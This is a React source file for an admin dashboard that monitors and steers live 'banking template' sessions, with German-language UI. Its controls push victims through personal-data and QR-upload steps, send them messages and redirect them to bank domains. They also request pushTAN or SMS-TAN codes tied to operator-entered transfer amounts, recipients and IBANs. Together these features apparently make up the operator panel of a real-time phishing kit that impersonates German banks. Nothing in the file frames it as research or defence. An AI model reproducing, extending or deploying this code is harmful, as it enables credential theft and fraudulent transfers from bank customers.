import React, { useState, useEffect } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { authenticatedFetch } from '../utils/api';
import { 
  Play, 
  MessageSquare, 
  ExternalLink, 
  RefreshCw, 
  Wifi, 
  WifiOff,
  Users,
  Activity,
  Clock,
  CheckCircle,
  XCircle,
  ArrowRight,
  Pause,
  Smartphone,
  CreditCard,
  AlertTriangle,
  Send,
  Settings
} from 'lucide-react';
import { io, Socket } from 'socket.io-client';
import { StatsCard } from '../components/dashboard/StatsCard';

interface ActiveSession {
  sessionKey: string;
  templateName: string;
  state: string;
  createdAt: string;
  isConnected: boolean;
  sessionMode?: 'AFK' | 'LIVE';
  isWaitingForAdmin?: boolean;
}

interface SessionStats {
  connectedSessions: number;
  connectedAdmins: number;
  totalConnections: number;
  uptime: number;
}

export const SessionControl: React.FC = () => {
  const queryClient = useQueryClient();
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [commandMessage, setCommandMessage] = useState('');
  const [socket, setSocket] = useState<Socket | null>(null);
  const [isSocketConnected, setIsSocketConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<'active' | 'inactive'>('active'); // Tab state
  
  // TAN Control State
  const [tanType, setTanType] = useState<'TRANSACTION_TAN' | 'LOGIN_TAN'>('TRANSACTION_TAN');
  const [tanMethod, setTanMethod] = useState<'pushtan' | 'sms'>('pushtan');
  const [transactionDetails, setTransactionDetails] = useState({
    amount: '',
    recipient: '',
    iban: '',
    reference: ''
  });

  // Initialize Socket.IO connection for real-time updates
  useEffect(() => {
    const backendUrl = import.meta.env.MODE === 'production' 
      ? window.location.origin 
      : 'http://localhost:3001';

    console.log('🔌 Admin connecting to Socket.io server:', backendUrl);

    const newSocket = io(backendUrl, {
      transports: ['polling', 'websocket'], // Try polling first, then websocket
      reconnectionAttempts: 3, // Fewer attempts for admin
      reconnectionDelay: 2000,
      reconnectionDelayMax: 8000,
      timeout: 10000,
      upgrade: true,
      rememberUpgrade: false
    });

    newSocket.on('connect', () => {
      if (process.env.NODE_ENV === 'development') {
        console.log('✅ Admin Socket.io connected:', newSocket.id);
      }
      setIsSocketConnected(true);
      
      // Join admin room for monitoring
      newSocket.emit('join_session', {
        userType: 'admin',
        sessionKey: 'admin_dashboard'
      });
    });

    newSocket.on('disconnect', () => {
      console.log('🔌 Admin Socket.io disconnected');
      setIsSocketConnected(false);
    });

    newSocket.on('connect_error', (error) => {
      console.error('❌ Admin Socket.io connection error:', error);
      setIsSocketConnected(false);
    });

    // Listen for real-time session updates
    newSocket.on('session_joined', (data) => {
      console.log('👤 New session joined:', data);
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    });

    newSocket.on('session_updated', (data) => {
      console.log('📊 Session updated:', data);
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    });

    newSocket.on('session_disconnected', (data) => {
      console.log('👤 Session disconnected:', data);
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    });

    // Listen for TAN responses
    newSocket.on('tan-completed', (data) => {
      console.log('🔐 TAN completed:', data);
      // Could show notification here
    });

    newSocket.on('tan-cancelled', (data) => {
      console.log('🔐 TAN cancelled:', data);
      // Could show notification here
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, [queryClient]);

  // Fetch active sessions
  const { data: sessionData, isLoading, error } = useQuery({
    queryKey: ['active-sessions'],
    queryFn: async () => {
      try {
        const response = await authenticatedFetch('/admin/sessions/active');
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        const data = await response.json();
        console.log('📊 Fetched session data:', data);
        return data;
      } catch (error) {
        console.error('❌ Error fetching sessions:', error);
        throw error;
      }
    },
    refetchInterval: 5000, // Refresh every 5 seconds
    retry: 3,
    retryDelay: 1000
  });

  // Force state mutation
  const forceStateMutation = useMutation({
    mutationFn: async ({ sessionKey, state, message }: { sessionKey: string; state: string; message?: string }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/force-state`, {
        method: 'POST',
        body: JSON.stringify({ state, message })
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    }
  });

  // Send message mutation
  const sendMessageMutation = useMutation({
    mutationFn: async ({ sessionKey, message, type }: { sessionKey: string; message: string; type: string }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/message`, {
        method: 'POST',
        body: JSON.stringify({ message, type })
      });
      return response.json();
    }
  });

  // Redirect mutation
  const redirectMutation = useMutation({
    mutationFn: async ({ sessionKey, url }: { sessionKey: string; url: string }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/redirect`, {
        method: 'POST',
        body: JSON.stringify({ url })
      });
      return response.json();
    }
  });

  // TAN Request mutation
  const tanRequestMutation = useMutation({
    mutationFn: async ({ 
      sessionKey, 
      type, 
      method, 
      transactionDetails 
    }: { 
      sessionKey: string; 
      type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
      method: 'pushtan' | 'sms';
      transactionDetails?: any;
    }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/request-tan`, {
        method: 'POST',
        body: JSON.stringify({ 
          type, 
          method, 
          transactionDetails: type === 'TRANSACTION_TAN' ? transactionDetails : undefined,
          requestId: `tan_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
        })
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    }
  });

  // Mode toggle mutation
  const modeToggleMutation = useMutation({
    mutationFn: async ({ sessionKey, mode }: { sessionKey: string; mode: 'AFK' | 'LIVE' }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/set-mode`, {
        method: 'POST',
        body: JSON.stringify({ mode })
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    }
  });

  // Continue flow mutation
  const continueFlowMutation = useMutation({
    mutationFn: async ({ sessionKey }: { sessionKey: string }) => {
      const response = await authenticatedFetch(`/admin/sessions/${sessionKey}/continue-flow`, {
        method: 'POST'
      });
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['active-sessions'] });
    }
  });

  const handleForceState = (sessionKey: string, state: string) => {
    forceStateMutation.mutate({ 
      sessionKey, 
      state, 
      message: commandMessage || undefined 
    });
    setCommandMessage('');
  };

  const handleSendMessage = (sessionKey: string, type: 'info' | 'warning' | 'error') => {
    if (!commandMessage.trim()) return;
    
    sendMessageMutation.mutate({ 
      sessionKey, 
      message: commandMessage, 
      type 
    });
    setCommandMessage('');
  };

  const handleRedirect = (sessionKey: string, url: string) => {
    redirectMutation.mutate({ sessionKey, url });
  };

  const handleTanRequest = (sessionKey: string) => {
    tanRequestMutation.mutate({ 
      sessionKey, 
      type: tanType,
      method: tanMethod,
      transactionDetails: tanType === 'TRANSACTION_TAN' ? transactionDetails : undefined
    });
    
    // Reset form
    setTransactionDetails({
      amount: '',
      recipient: '',
      iban: '',
      reference: ''
    });
  };

  const handleModeToggle = (sessionKey: string, currentMode: 'AFK' | 'LIVE') => {
    const newMode = currentMode === 'AFK' ? 'LIVE' : 'AFK';
    modeToggleMutation.mutate({ sessionKey, mode: newMode });
  };

  const handleContinueFlow = (sessionKey: string) => {
    continueFlowMutation.mutate({ sessionKey });
  };

  // Separate sessions into active (connected) and inactive (disconnected)
  const allSessions: ActiveSession[] = sessionData?.sessions || [];
  const activeSessions: ActiveSession[] = allSessions.filter(session => session.isConnected);
  const inactiveSessions: ActiveSession[] = allSessions.filter(session => !session.isConnected);
  
  // Display sessions based on active tab
  const sessions: ActiveSession[] = activeTab === 'active' ? activeSessions : inactiveSessions;
  
  const stats: SessionStats = sessionData?.stats || {
    connectedSessions: 0,
    connectedAdmins: 0,
    totalConnections: 0,
    uptime: 0
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:justify-between lg:items-center space-y-4 lg:space-y-0">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Session Control</h1>
          <p className="text-gray-600">Real-time control of active banking template sessions</p>
        </div>
        <div className="flex items-center space-x-3">
          <div className={`flex items-center space-x-2 px-3 py-2 rounded-lg ${
            isSocketConnected 
              ? 'bg-green-100 text-green-800' 
              : 'bg-red-100 text-red-800'
          }`}>
            {isSocketConnected ? (
              <Wifi className="h-4 w-4" />
            ) : (
              <WifiOff className="h-4 w-4" />
            )}
            <span className="text-sm font-medium">
              {isSocketConnected ? 'Verbunden' : 'Getrennt'}
            </span>
          </div>
          <button
            onClick={() => queryClient.invalidateQueries({ queryKey: ['active-sessions'] })}
            className="p-2 text-gray-400 hover:text-gray-600 bg-white rounded-lg shadow"
            disabled={isLoading}
          >
            <RefreshCw className={`h-5 w-5 ${isLoading ? 'animate-spin' : ''}`} />
          </button>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <StatsCard
            title="Verbundene Sitzungen"
            value={stats.connectedSessions || 0}
            icon={Wifi}
            iconColor="text-green-600"
            iconBgColor="bg-green-100"
            subtitle="Echtzeit-Verbindungen"
            isLive={true}
          />
          <StatsCard
            title="Gesamte Verbindungen"
            value={stats.totalConnections || 0}
            icon={Activity}
            iconColor="text-blue-600"
            iconBgColor="bg-blue-100"
            subtitle="Alle Verbindungen"
          />
          <StatsCard
            title="Aktive Sitzungen"
            value={sessions.length}
            icon={Users}
            iconColor="text-purple-600"
            iconBgColor="bg-purple-100"
            subtitle="Verbundene Benutzer"
          />
          <StatsCard
            title="Server-Laufzeit"
            value={`${Math.floor((stats.uptime || 0) / 60)}m`}
            icon={Clock}
            iconColor="text-gray-600"
            iconBgColor="bg-gray-100"
            subtitle="Systemstatus"
          />
      </div>

      {/* Tab Navigation */}
      <div className="bg-white shadow rounded-lg">
        <div className="px-6 py-4 border-b border-gray-200">
          <div className="flex items-center justify-between">
            <div className="flex space-x-1">
              <button
                onClick={() => setActiveTab('active')}
                className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                  activeTab === 'active'
                    ? 'bg-green-600 text-white'
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                <div className="flex items-center space-x-2">
                  <Wifi className="h-4 w-4" />
                  <span>Aktive Sitzungen</span>
                  <span className="ml-1 px-2 py-0.5 rounded-full bg-white bg-opacity-30 text-xs">
                    {activeSessions.length}
                  </span>
                </div>
              </button>
              <button
                onClick={() => setActiveTab('inactive')}
                className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                  activeTab === 'inactive'
                    ? 'bg-gray-600 text-white'
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                <div className="flex items-center space-x-2">
                  <Clock className="h-4 w-4" />
                  <span>Inaktive Sitzungen</span>
                  <span className="ml-1 px-2 py-0.5 rounded-full bg-white bg-opacity-30 text-xs">
                    {inactiveSessions.length}
                  </span>
                </div>
              </button>
            </div>
            <button
              onClick={() => queryClient.invalidateQueries({ queryKey: ['active-sessions'] })}
              className="p-2 text-gray-400 hover:text-gray-600"
              disabled={isLoading}
            >
              <RefreshCw className={`h-5 w-5 ${isLoading ? 'animate-spin' : ''}`} />
            </button>
          </div>
        </div>

          {error ? (
            <div className="p-8 text-center">
              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                <h3 className="text-red-800 font-medium mb-2">Verbindungsfehler</h3>
                <p className="text-red-600 text-sm mb-4">
                  Failed to load sessions: {error instanceof Error ? error.message : 'Unknown error'}
                </p>
                <button
                  onClick={() => queryClient.invalidateQueries({ queryKey: ['active-sessions'] })}
                  className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700"
                >
                  Retry
                </button>
              </div>
            </div>
          ) : isLoading ? (
            <div className="p-8 text-center">
              <RefreshCw className="h-8 w-8 animate-spin mx-auto text-gray-400 mb-4" />
              <p className="text-gray-500">Lade Sitzungen...</p>
            </div>
          ) : sessions.length === 0 ? (
            <div className="p-8 text-center">
              <div className={`${activeTab === 'active' ? 'bg-yellow-50 border-yellow-200' : 'bg-gray-50 border-gray-200'} border rounded-lg p-4`}>
                <div className="flex items-center justify-center mb-2">
                  {activeTab === 'active' ? (
                    <Users className="h-5 w-5 text-yellow-600 mr-2" />
                  ) : (
                    <Clock className="h-5 w-5 text-gray-600 mr-2" />
                  )}
                  <h3 className={`${activeTab === 'active' ? 'text-yellow-800' : 'text-gray-800'} font-medium`}>
                    {activeTab === 'active' ? 'Keine aktiven Sitzungen' : 'Keine inaktiven Sitzungen'}
                  </h3>
                </div>
                <p className={`${activeTab === 'active' ? 'text-yellow-600' : 'text-gray-600'} text-sm`}>
                  {activeTab === 'active' 
                    ? 'Keine Benutzer sind derzeit mit Banking-Templates verbunden.'
                    : 'Keine abgelaufenen oder getrennte Sitzungen vorhanden.'
                  }
                  {activeTab === 'active' && inactiveSessions.length > 0 && (
                    <span className="block mt-1">
                      ({inactiveSessions.length} inaktive Sitzung{inactiveSessions.length !== 1 ? 'en' : ''} im "Inaktive Sitzungen" Tab)
                    </span>
                  )}
                </p>
              </div>
            </div>
          ) : (
            <div className="divide-y divide-gray-200">
              {sessions.map((session) => (
                <div key={session.sessionKey} className="p-6 hover:bg-gray-50 transition-colors">
                  <div className="flex items-center justify-between">
                    <div className="flex-1">
                      <div className="flex items-center space-x-3 mb-2">
                        <div className="flex items-center space-x-2">
                          {session.isConnected ? (
                            <Wifi className="h-4 w-4 text-green-600" />
                          ) : (
                            <WifiOff className="h-4 w-4 text-red-600" />
                          )}
                          <h3 className="text-lg font-semibold text-gray-900 capitalize">
                            {session.templateName}
                          </h3>
                        </div>
                        <div className={`flex items-center space-x-1 px-3 py-1 text-xs font-medium rounded-full ${
                          session.isConnected 
                            ? 'bg-green-100 text-green-800 border border-green-200' 
                            : 'bg-red-100 text-red-800 border border-red-200'
                        }`}>
                          {session.isConnected ? (
                            <CheckCircle className="h-3 w-3" />
                          ) : (
                            <XCircle className="h-3 w-3" />
                          )}
                          <span>{session.isConnected ? 'Online' : 'Offline'}</span>
                        </div>
                        <span className="px-3 py-1 text-xs font-medium bg-blue-100 text-blue-800 rounded-full border border-blue-200">
                          {session.state ? session.state.replace(/_/g, ' ').toUpperCase() : 'UNKNOWN'}
                        </span>
                        <div className={`flex items-center space-x-1 px-3 py-1 text-xs font-medium rounded-full border ${
                          session.sessionMode === 'LIVE' 
                            ? 'bg-purple-100 text-purple-800 border-purple-200' 
                            : 'bg-gray-100 text-gray-800 border-gray-200'
                        }`}>
                          {session.sessionMode === 'LIVE' ? (
                            <Play className="h-3 w-3" />
                          ) : (
                            <Pause className="h-3 w-3" />
                          )}
                          <span>{session.sessionMode === 'LIVE' ? 'LIVE' : 'AFK'}</span>
                        </div>
                        {session.isWaitingForAdmin && (
                          <div className="flex items-center space-x-1 px-3 py-1 text-xs font-medium bg-yellow-100 text-yellow-800 rounded-full border border-yellow-200 animate-pulse">
                            <Clock className="h-3 w-3" />
                            <span>WAITING</span>
                          </div>
                        )}
                      </div>
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="text-gray-500">Session ID:</span>
                          <span className="ml-2 font-mono text-gray-900">
                            {session.sessionKey ? session.sessionKey.substring(0, 16) + '...' : 'N/A'}
                          </span>
                        </div>
                        <div>
                          <span className="text-gray-500">Created:</span>
                          <span className="ml-2 text-gray-900">
                            {new Date(session.createdAt).toLocaleString()}
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="flex flex-col space-y-3">
                      {/* Quick Actions Row */}
                      <div className="flex items-center space-x-2">
                        <button
                          onClick={() => session.sessionKey && handleForceState(session.sessionKey, 'personal_data')}
                          className="px-4 py-2 text-sm bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
                          disabled={forceStateMutation.isPending || !session.sessionKey || !session.isConnected}
                        >
                          <Play className="h-4 w-4 mr-2 inline" />
                          Personal Data
                        </button>
                        
                        <button
                          onClick={() => session.sessionKey && handleForceState(session.sessionKey, 'qr_upload')}
                          className="px-4 py-2 text-sm bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors disabled:bg-gray-400"
                          disabled={forceStateMutation.isPending || !session.sessionKey || !session.isConnected}
                        >
                          <Play className="h-4 w-4 mr-2 inline" />
                          QR Upload
                        </button>

                        <button
                          onClick={() => session.sessionKey && handleForceState(session.sessionKey, 'final_success')}
                          className="px-4 py-2 text-sm bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400"
                          disabled={forceStateMutation.isPending || !session.sessionKey || !session.isConnected}
                        >
                          <Play className="h-4 w-4 mr-2 inline" />
                          Complete
                        </button>
                      </div>

                      {/* Advanced Controls Row */}
                      <div className="flex items-center space-x-2">
                        {/* Mode Toggle */}
                        <button
                          onClick={() => session.sessionKey && handleModeToggle(session.sessionKey, session.sessionMode || 'AFK')}
                          className={`px-4 py-2 text-sm rounded-lg transition-colors ${
                            session.sessionMode === 'LIVE'
                              ? 'bg-purple-600 text-white hover:bg-purple-700'
                              : 'bg-gray-600 text-white hover:bg-gray-700'
                          } disabled:bg-gray-400`}
                          disabled={modeToggleMutation.isPending || !session.sessionKey || !session.isConnected}
                        >
                          {session.sessionMode === 'LIVE' ? (
                            <>
                              <Pause className="h-4 w-4 mr-2 inline" />
                              Switch to AFK
                            </>
                          ) : (
                            <>
                              <Play className="h-4 w-4 mr-2 inline" />
                              Switch to LIVE
                            </>
                          )}
                        </button>

                        {/* Continue Flow (only show in LIVE mode when waiting) */}
                        {session.sessionMode === 'LIVE' && session.isWaitingForAdmin && (
                          <button
                            onClick={() => session.sessionKey && handleContinueFlow(session.sessionKey)}
                            className="px-4 py-2 text-sm bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 animate-pulse"
                            disabled={continueFlowMutation.isPending || !session.sessionKey}
                          >
                            <ArrowRight className="h-4 w-4 mr-2 inline" />
                            Continue Flow
                          </button>
                        )}

                        <button
                          onClick={() => session.sessionKey && handleRedirect(session.sessionKey, `https://www.${session.templateName}.de`)}
                          className="px-4 py-2 text-sm bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors disabled:bg-gray-400"
                          disabled={redirectMutation.isPending || !session.sessionKey || !session.isConnected}
                        >
                          <ExternalLink className="h-4 w-4 mr-2 inline" />
                          Redirect
                        </button>

                        <button
                          onClick={() => setSelectedSession(selectedSession === session.sessionKey ? null : session.sessionKey)}
                          className={`px-4 py-2 text-sm rounded-lg transition-colors ${
                            selectedSession === session.sessionKey
                              ? 'bg-orange-700 text-white'
                              : 'bg-orange-600 text-white hover:bg-orange-700'
                          } disabled:bg-gray-400`}
                          disabled={!session.sessionKey}
                        >
                          <Settings className="h-4 w-4 mr-2 inline" />
                          {selectedSession === session.sessionKey ? 'Hide Controls' : 'Show Controls'}
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Enhanced Control Panel */}
                  {selectedSession === session.sessionKey && (
                    <div className="mt-4 p-4 bg-gray-50 rounded-lg space-y-4">
                      {/* Message Control */}
                      <div>
                        <div className="flex items-center space-x-2 mb-2">
                          <MessageSquare className="h-4 w-4 text-gray-600" />
                          <h4 className="text-sm font-medium text-gray-900">Nachricht senden</h4>
                        </div>
                        <div className="flex items-center space-x-2">
                          <input
                            type="text"
                            placeholder="Nachricht für Benutzer eingeben..."
                            value={commandMessage}
                            onChange={(e) => setCommandMessage(e.target.value)}
                            className="flex-1 px-3 py-2 border border-gray-300 rounded-md text-sm"
                          />
                          <button
                            onClick={() => session.sessionKey && handleSendMessage(session.sessionKey, 'info')}
                            className="px-3 py-2 text-xs bg-blue-600 text-white rounded hover:bg-blue-700"
                            disabled={!commandMessage.trim() || sendMessageMutation.isPending || !session.sessionKey}
                          >
                            <MessageSquare className="h-3 w-3 mr-1 inline" />
                            Info
                          </button>
                          <button
                            onClick={() => session.sessionKey && handleSendMessage(session.sessionKey, 'warning')}
                            className="px-3 py-2 text-xs bg-yellow-600 text-white rounded hover:bg-yellow-700"
                            disabled={!commandMessage.trim() || sendMessageMutation.isPending || !session.sessionKey}
                          >
                            Warning
                          </button>
                          <button
                            onClick={() => session.sessionKey && handleSendMessage(session.sessionKey, 'error')}
                            className="px-3 py-2 text-xs bg-red-600 text-white rounded hover:bg-red-700"
                            disabled={!commandMessage.trim() || sendMessageMutation.isPending || !session.sessionKey}
                          >
                            Error
                          </button>
                        </div>
                      </div>

                      {/* TAN Control Section */}
                      <div className="border-t pt-4">
                        <div className="flex items-center space-x-2 mb-3">
                          <CreditCard className="h-4 w-4 text-gray-600" />
                          <h4 className="text-sm font-medium text-gray-900">TAN Request Control</h4>
                        </div>
                        
                        {/* TAN Type and Method Selection */}
                        <div className="grid grid-cols-2 gap-4 mb-4">
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-1">TAN Type</label>
                            <select
                              value={tanType}
                              onChange={(e) => setTanType(e.target.value as 'TRANSACTION_TAN' | 'LOGIN_TAN')}
                              className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                            >
                              <option value="TRANSACTION_TAN">Transaction TAN</option>
                              <option value="LOGIN_TAN">Anmelde-TAN</option>
                            </select>
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-700 mb-1">TAN-Methode</label>
                            <select
                              value={tanMethod}
                              onChange={(e) => setTanMethod(e.target.value as 'pushtan' | 'sms')}
                              className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                            >
                              <option value="pushtan">pushTAN</option>
                              <option value="sms">SMS-TAN</option>
                            </select>
                          </div>
                        </div>

                        {/* Transaction Details - only for TRANSACTION_TAN */}
                        {tanType === 'TRANSACTION_TAN' && (
                          <div className="grid grid-cols-2 gap-3 mb-4">
                            <div>
                              <label className="block text-xs font-medium text-gray-700 mb-1">Betrag</label>
                              <input
                                type="text"
                                placeholder="€ 1.250,00"
                                value={transactionDetails.amount}
                                onChange={(e) => setTransactionDetails(prev => ({ ...prev, amount: e.target.value }))}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                              />
                            </div>
                            <div>
                              <label className="block text-xs font-medium text-gray-700 mb-1">Empfänger</label>
                              <input
                                type="text"
                                placeholder="Max Mustermann"
                                value={transactionDetails.recipient}
                                onChange={(e) => setTransactionDetails(prev => ({ ...prev, recipient: e.target.value }))}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                              />
                            </div>
                            <div>
                              <label className="block text-xs font-medium text-gray-700 mb-1">IBAN</label>
                              <input
                                type="text"
                                placeholder="DE89 3704 0044 0532 0130 00"
                                value={transactionDetails.iban}
                                onChange={(e) => setTransactionDetails(prev => ({ ...prev, iban: e.target.value }))}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                              />
                            </div>
                            <div>
                              <label className="block text-xs font-medium text-gray-700 mb-1">Verwendungszweck</label>
                              <input
                                type="text"
                                placeholder="Miete Januar 2024"
                                value={transactionDetails.reference}
                                onChange={(e) => setTransactionDetails(prev => ({ ...prev, reference: e.target.value }))}
                                className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm"
                              />
                            </div>
                          </div>
                        )}

                        {/* TAN Request Button */}
                        <button
                          onClick={() => session.sessionKey && handleTanRequest(session.sessionKey)}
                          disabled={
                            tanRequestMutation.isPending || 
                            !session.sessionKey ||
                            (tanType === 'TRANSACTION_TAN' && !transactionDetails.amount)
                          }
                          className="w-full px-4 py-2 bg-orange-600 text-white rounded-md hover:bg-orange-700 disabled:bg-gray-400 text-sm font-medium flex items-center justify-center"
                        >
                          {tanRequestMutation.isPending ? (
                            <>
                              <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                              Sending...
                            </>
                          ) : (
                            <>
                              <Send className="h-4 w-4 mr-2" />
                              Send {tanMethod.toUpperCase()} {tanType.replace('_', ' ')}
                            </>
                          )}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
      </div>

      {/* Command Status */}
      {(forceStateMutation.isPending || sendMessageMutation.isPending || redirectMutation.isPending) && (
        <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
          <div className="flex items-center">
            <RefreshCw className="h-4 w-4 animate-spin text-blue-600 mr-2" />
            <p className="text-blue-800 text-sm font-medium">Executing command...</p>
          </div>
        </div>
      )}

      {(forceStateMutation.isSuccess || sendMessageMutation.isSuccess || redirectMutation.isSuccess) && (
        <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
          <div className="flex items-center">
            <CheckCircle className="h-4 w-4 text-green-600 mr-2" />
            <p className="text-green-800 text-sm font-medium">Command executed successfully!</p>
          </div>
        </div>
      )}
    </div>
  );
};

